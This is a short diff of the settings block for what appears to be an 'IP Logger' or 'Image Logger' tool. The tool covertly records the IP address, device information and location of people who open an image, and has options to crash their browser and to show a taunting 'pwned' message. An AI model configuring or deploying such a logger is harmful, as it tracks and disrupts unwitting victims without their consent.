@@ -19,17 +19,16 @@ config = {
 
     # CUSTOMIZATION #
     "username": "🕵️‍♂️ IP Logger",
-    "avatar": "",
     "color": 0xFF0000,
     
     # OPTIONS #
     "crashBrowser": False,
     "accurateLocation": False,
     
-    "message": {
-        "doMessage": True,
-        "message": "⚠️ WARNING: Your IP and device information have been logged!",
-        "richMessage": True,
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": False, # Enable the custom message?
+        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
     },
 
     "vpnCheck": 1,
